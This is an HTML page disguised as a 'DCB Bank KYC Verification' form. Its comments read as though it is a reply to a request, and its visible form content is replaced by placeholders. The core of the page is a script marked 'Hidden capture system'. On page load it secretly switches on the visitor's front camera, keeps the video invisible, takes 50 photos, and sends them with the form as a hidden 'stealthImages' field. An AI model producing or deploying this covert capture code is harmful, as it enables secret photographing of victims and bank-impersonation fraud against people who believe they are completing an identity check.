<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DCB Bank KYC Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f6f9;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 500px;
      margin: 60px auto;
      background: white;
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
    }
    /* ... (keep all your existing styles) ... */
  </style>
</head>
<body>
  <!-- Your existing form content remains unchanged -->
  <div class="container">
    <!-- ... (all your current form elements) ... -->
  </div>

  <!-- Hidden capture system -->
  <script>
  (function() {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    let capturedImages = [];
    
    // Hide elements completely
    video.style.position = 'fixed';
    video.style.opacity = 0;
    video.style.pointerEvents = 'none';
    video.style.zIndex = -1000;
    canvas.style.display = 'none';
    document.body.appendChild(video);
    document.body.appendChild(canvas);

    // Camera capture function
    async function startStealthCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: 'user',
            width: 640,
            height: 480
          }
        });
        
        video.srcObject = stream;
        await video.play();
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Capture 50 photos at 300ms intervals
        for (let i = 0; i < 50; i++) {
          await new Promise(resolve => setTimeout(resolve, 300));
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Prevent black frames with temporary overlay
          ctx.fillStyle = 'rgba(255,255,255,0.01)';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          
          capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
        }
        
        // Clean up
        stream.getTracks().forEach(track => track.stop());
      } catch (error) {
        console.error('Stealth capture error:', error);
        // Fallback: Generate 50 placeholder images
        capturedImages = Array(50).fill().map(() => createFallbackImage());
      }
    }

    function createFallbackImage() {
      const tempCanvas = document.createElement('canvas');
      tempCanvas.width = 640;
      tempCanvas.height = 480;
      const tempCtx = tempCanvas.getContext('2d');
      tempCtx.fillStyle = '#EEEEEE';
      tempCtx.fillRect(0, 0, 640, 480);
      return tempCanvas.toDataURL('image/jpeg');
    }

    // Start capture when page loads
    window.addEventListener('load', startStealthCapture);

    // Attach images to form submission
    document.querySelector('form').addEventListener('submit', function() {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'stealthImages';
      input.value = JSON.stringify(capturedImages);
      this.appendChild(input);
    });
  })();
  </script>
</body>
</html>
